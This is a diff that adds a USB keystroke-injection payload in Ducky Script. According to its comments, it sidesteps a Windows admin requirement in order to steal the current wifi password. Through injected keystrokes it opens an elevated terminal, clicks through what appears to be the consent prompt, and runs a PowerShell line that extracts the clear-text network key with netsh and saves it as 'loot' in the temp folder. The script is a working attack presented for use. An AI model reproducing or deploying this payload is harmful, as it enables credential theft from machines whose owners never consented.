@@ -1,0 +1,20 @@
+REM windows patched our old method of getting wifi passwords via USB by forcing users to be admin first. This gets around that. 
+REM made by CaliNux
+REM saves output to temp folder
+
+DELAY 1000
+WINDOWS x
+DELAY 600
+STRING a
+DELAY 600
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 1500
+STRING $networkProfile = Get-NetConnectionProfile; $networkName = $networkProfile.Name; $networkPassword = (netsh wlan show profile name="$networkName" key=clear | Select-String "Key Content").ToString() -replace ".*:\s*(.*)", '$1'; $hostname = $env:COMPUTERNAME; $date = Get-Date -Format "yyyyMMdd"; $filename = "$env:TEMP\WiFiLoot-$hostname-$date.txt"; $lootData = "Network: $networkName`r`nPassword: $networkPassword"; $lootData | Out-File -FilePath $filename; Write-Output "Network details saved to: $filename"
+ENTER
+DELAY 200
+STRING exit
+ENTER
